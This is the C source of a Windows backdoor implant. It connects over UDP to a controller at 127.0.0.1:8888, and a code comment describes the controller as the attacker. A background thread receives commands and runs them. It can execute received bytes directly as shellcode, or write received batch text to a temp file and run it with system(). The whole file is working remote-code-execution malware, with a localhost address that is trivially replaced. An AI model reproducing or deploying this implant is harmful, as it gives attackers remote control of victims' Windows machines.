#undef UNICODE
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdarg.h>
#include "../Command.h"
#define PORT 8888
#define BUFFER_SIZE 1024
SOCKET sock;
struct sockaddr_in client;
char server_address[] = "127.0.0.1";
void CDECL logdA(const char * szFormat, ...) {
	static char szBuffer[1024];
	static char szB2[1024];
	static SYSTEMTIME st;
	va_list pArgList;
	va_start(pArgList, szFormat);
	vsnprintf_s(szBuffer, sizeof(szBuffer) / sizeof(char), szFormat, pArgList);
	va_end(pArgList);
	GetLocalTime(&st);
	wsprintfA(szB2, "%02d:%02d:%02d.%03d [%d] %s\n",
		// current time
		st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
		// process id
		GetCurrentProcessId(),
		// debug log
		szBuffer);
	OutputDebugStringA(szB2);
}
int fileExists(char * file)
{
	WIN32_FIND_DATAA FindFileData;
	HANDLE handle = FindFirstFileA(file, &FindFileData);
	int found = handle != INVALID_HANDLE_VALUE;
	if (found)
	{
		//FindClose(&handle); this will crash
		FindClose(handle);
	}
	return found;
}
// 循环接收攻击者发来的ShellCode
DWORD WINAPI fBackgroundThread(LPVOID) {
	int recv_len, client_size = sizeof(client);
	char shellcode[BUFFER_SIZE] = "init";
	int r = sendto(sock, shellcode, 5, 0, (struct sockaddr*) & client, client_size);
	logdA("r=%d", r);
	while (true) {
		recv_len = recvfrom(sock, shellcode, BUFFER_SIZE, 0,
			(struct sockaddr *) & client, &client_size);
		logdA("shellcode[0]=%c", shellcode[0]);
		if (recv_len <= 0) {
			continue;
		}
		switch (shellcode[0]) {
		case CMD_MSG_BOX:
			MessageBoxA(nullptr, (char*)((char*)shellcode+1), "警告", 0);
			break;
		case CMD_SHELL_CODE:
			((void(*)(void))(void*)(((char*)shellcode)+1))();
			break;
		case CMD_BATCH: {
			char dir[1024];
			char filePath[1024];
			char *content = shellcode + 1;
			GetTempPathA(1024, dir);
			wsprintfA(filePath, "%sbatch.bat", dir);
			if (fileExists(filePath)) {
				DeleteFileA(filePath);
			}
			HANDLE hFile = CreateFileA(filePath,
				GENERIC_WRITE,
				0,
				NULL,
				CREATE_NEW,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
			DWORD dwBytesWritten;
			WriteFile(
				hFile,
				content,
				strlen(content),
				&dwBytesWritten,
				NULL);
			CloseHandle(hFile);//关闭句柄刷新输出缓冲区保存更改
			system(filePath);
			break;
		}
		case CMD_NOPE:
		default:
			break;
		}
		shellcode[0] = 'o'; shellcode[1] = 'k'; shellcode[2] = '\0';
		sendto(sock, shellcode, recv_len, 0, (struct sockaddr*) & client, client_size);
	}
	return 0;
}
int WINAPI WinMain(HINSTANCE, HINSTANCE, PSTR, int)
{
	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);
	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	client.sin_family = AF_INET;
	client.sin_addr.S_un.S_addr = inet_addr(server_address);
	client.sin_port = htons(PORT);
	struct timeval tv;
	tv.tv_sec = 0;
	tv.tv_usec = 100000;
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
	HANDLE hBackgroundThread = CreateThread(nullptr, 0, fBackgroundThread,
		nullptr, 0, nullptr);
	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	closesocket(sock);
	WSACleanup();
	CloseHandle(hBackgroundThread);
	return (int)msg.wParam;
}